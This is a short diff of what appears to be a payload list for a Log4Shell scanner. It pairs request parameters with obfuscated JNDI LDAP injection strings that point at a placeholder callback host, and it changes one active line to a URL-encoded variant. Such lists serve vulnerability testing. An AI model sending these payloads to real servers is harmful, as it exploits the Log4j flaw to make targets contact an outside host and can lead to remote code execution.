@@ -1,7 +1,7 @@
 # Lines starting with # are ignored
 #param,u,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/
 #param,href,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/
-param,action,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/
+param,action,$%7Bjn$%7Blower:d%7Di:l$%7Blower:d%7Dap://$%7Blower:x%7D$%7Blower:f%7D.%s/a%7D/
 #param,host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
 #param,http_host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
 #param,email,root@${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
